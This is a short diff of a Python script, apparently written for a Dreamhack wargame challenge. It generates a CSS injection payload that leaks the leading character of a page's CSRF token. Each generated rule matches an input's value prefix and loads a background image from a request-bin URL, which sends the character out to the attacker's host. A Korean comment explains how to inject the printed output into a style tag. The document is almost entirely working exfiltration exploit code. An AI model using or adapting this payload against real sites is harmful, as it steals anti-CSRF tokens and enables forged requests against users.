@@ -1,6 +1,8 @@
 CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-BIN_URL = "https://webhook.site/373dea22-cd45-42a5-9125-9c49458e356b" 
+BIN_URL = "https://brcgtxx.request.dreamhack.games"
 
-with open("red.css", "w") as f:
-    for c in CHARS:
-        f.write(f'input[name="csrf"][value^="{c}"] {{ background: url("{BIN_URL}?q={c}"); }}\n')
+css_payload = ""
+for c in CHARS:
+    css_payload += f'input[name="csrf"][value^="{c}"] {{ background: url("{BIN_URL}?q={c}"); }}\n'
+
+print(css_payload)  # 출력해서 HTML <style> 태그 안에 넣거나 웹 응답으로 사용 가능
